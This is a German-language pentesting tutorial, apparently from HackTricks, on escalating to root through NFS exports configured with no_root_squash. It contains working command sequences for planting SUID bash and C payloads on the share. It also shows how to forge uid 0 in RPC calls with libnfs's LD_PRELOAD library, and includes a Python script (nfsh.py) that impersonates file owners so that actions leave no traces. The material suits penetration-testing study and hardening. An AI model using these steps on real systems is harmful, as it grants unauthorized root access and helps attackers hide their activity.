# NFS No Root Squash Fehlkonfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}


## Grundlegende Informationen zu Squashing

NFS vertraut normalerweise (insbesondere unter Linux) auf die vom Client angegebenen `uid` und `gid`, um auf die Dateien zuzugreifen (wenn Kerberos nicht verwendet wird). Es gibt jedoch einige Konfigurationen, die auf dem Server gesetzt werden können, um **dieses Verhalten zu ändern**:

- **`all_squash`**: Dabei werden alle Zugriffe reduziert, indem jeder Benutzer und jede Gruppe auf **`nobody`** (65534 unsigned / -2 signed) abgebildet wird. Daher ist jeder `nobody`, und es werden keine Benutzer verwendet.
- **`root_squash`/`no_all_squash`**: Dies ist die Standardeinstellung unter Linux und reduziert **nur Zugriffe mit der uid 0 (root)**. Daher werden alle `UID` und `GID` vertraut, aber `0` wird auf `nobody` reduziert (somit ist keine root-Impersonation möglich).
- **``no_root_squash`**: Wenn diese Konfiguration aktiviert ist, wird nicht einmal der root-Benutzer reduziert. Das bedeutet, dass du auf ein Verzeichnis, das mit dieser Konfiguration eingebunden wurde, als root zugreifen kannst.

Wenn du in der Datei **/etc/exports** ein Verzeichnis findest, das als **no_root_squash** konfiguriert ist, kannst du **als Client** darauf **zugreifen** und **in dieses Verzeichnis schreiben**, als wärst du der lokale **root**-Benutzer des Rechners.

Weitere Informationen zu **NFS** findest du unter:


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Option 1 mit bash:
- **Einbinden dieses Verzeichnisses** auf einem Client-Rechner, anschließend **als root** die Binärdatei **/bin/bash** in den eingebundenen Ordner kopieren, ihr **SUID**-Rechte geben und diese Bash-Binärdatei auf dem **Victim**-Rechner ausführen.
- Beachte, dass auf dem NFS-Share **`no_root_squash`** auf dem Server konfiguriert sein muss, um dort root zu sein.
- Wenn dies jedoch nicht aktiviert ist, könntest du zu einem anderen Benutzer eskalieren, indem du die Binärdatei auf den NFS-Share kopierst und ihr die SUID-Berechtigung als der Benutzer gibst, zu dem du eskalieren möchtest.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 mit kompiliertem C-Code:
- **Einbinden dieses Verzeichnisses** auf einem Client-Rechner und **als root das kompilierte Payload** in den eingebundenen Ordner kopieren, das die SUID-Berechtigung ausnutzt, ihm **SUID**-Rechte geben und diese Binärdatei auf dem **Opfer-Rechner** ausführen (hier findest du einige [C-SUID-Payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Dieselben Einschränkungen wie zuvor
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Beachte, dass du weiterhin die Remote-Version verwenden kannst, um diese Privilege Escalation auszunutzen, wenn du **einen Tunnel von deiner Maschine zur Opfermaschine erstellen und die erforderlichen Ports tunneln kannst**.\
> Der folgende Trick gilt für den Fall, dass die Datei `/etc/exports` **eine IP-Adresse angibt**. In diesem Fall **wirst du den Remote Exploit in keinem Fall verwenden können** und musst **diesen Trick ausnutzen**.\
> Eine weitere Voraussetzung für das Funktionieren des Exploits ist, dass der Export in **`/etc/export`** das Flag `insecure` verwenden **muss**.\
> --_Ich bin mir nicht sicher, ob dieser Trick funktioniert, wenn `/etc/export` eine IP-Adresse angibt_--

### Grundlegende Informationen

Das Szenario umfasst das Ausnutzen eines gemounteten NFS-Shares auf einer lokalen Maschine. Dabei wird ein Fehler in der NFSv3-Spezifikation ausgenutzt, durch den der Client seine uid/gid angeben kann, was möglicherweise unautorisierten Zugriff ermöglicht. Das Ausnutzen umfasst die Verwendung von [libnfs](https://github.com/sahlberg/libnfs), einer Library, die das Fälschen von NFS-RPC-Calls ermöglicht.

#### Kompilieren der Library

Die Schritte zum Kompilieren der Library müssen möglicherweise abhängig von der Kernel-Version angepasst werden. In diesem speziellen Fall wurden die fallocate-Syscalls auskommentiert. Der Kompilierungsprozess umfasst die folgenden Befehle:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Durchführen des Exploits

Der Exploit umfasst das Erstellen eines einfachen C-Programms (`pwn.c`), das die Berechtigungen auf root erhöht und anschließend eine Shell startet. Das Programm wird kompiliert, und die resultierende Binärdatei (`a.out`) wird mit suid root auf dem Share platziert, wobei `ld_nfs.so` verwendet wird, um die uid in den RPC-Aufrufen zu fälschen:

1. **Exploit-Code kompilieren:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Lege den exploit auf der Freigabe ab und ändere seine Berechtigungen, indem du die uid fälschst:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Exploit ausführen, um Root-Rechte zu erlangen:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell für unauffälligen Dateizugriff

Sobald root access erlangt wurde, wird ein Python-Skript (nfsh.py) verwendet, um mit dem NFS share zu interagieren, ohne den Eigentümer zu ändern (um keine Spuren zu hinterlassen). Dieses Skript passt die uid an die der Datei an, auf die zugegriffen wird, und ermöglicht so die Interaktion mit Dateien auf dem share ohne Berechtigungsprobleme:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Ausführen wie:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
